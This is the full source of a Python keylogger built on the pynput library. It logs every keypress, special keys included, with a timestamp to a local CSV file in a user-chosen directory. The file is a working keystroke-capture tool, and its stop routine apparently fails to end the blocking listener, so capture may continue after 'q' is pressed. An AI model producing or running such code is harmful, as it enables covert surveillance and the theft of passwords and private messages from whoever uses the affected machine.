import os
import csv
import threading
from pynput import keyboard
from datetime import datetime

class Keylogger:
    def __init__(self, log_dir):
        self.log_dir = log_dir
        self.log_path = os.path.join(log_dir, "keylog.csv")
        self.running = False
        self.lock = threading.Lock()

    def start(self):
        self.running = True
        self.start_logging()
        print("Keylogger started.")

    def stop(self):
        self.running = False
        print("Keylogger stopped.")

    def on_press(self, key):
        try:
            char = key.char
        except AttributeError:
            if key == keyboard.Key.space:
                char = ' '
            else:
                char = f'[{key.name}]'

        with self.lock:
            with open(self.log_path, 'a', newline='') as log_file:
                writer = csv.writer(log_file)
                writer.writerow([datetime.now(), char])

    def start_logging(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            while self.running:
                listener.join()

if __name__ == "__main__":
    log_directory = input("Enter the directory to save the logs (press Enter for default directory): ").strip()
    if not log_directory:
        log_directory = os.path.join(os.getcwd(), "Keylogs")

    if not os.path.exists(log_directory):
        os.makedirs(log_directory)

    keylogger = Keylogger(log_directory)
    keylogger_thread = threading.Thread(target=keylogger.start)

    print("Keylogger started. Press 'q' to stop.")
    keylogger_thread.start()

    while True:
        if input() == 'q':
            keylogger.stop()
            keylogger_thread.join()
            print("Keylogger stopped.")
            break
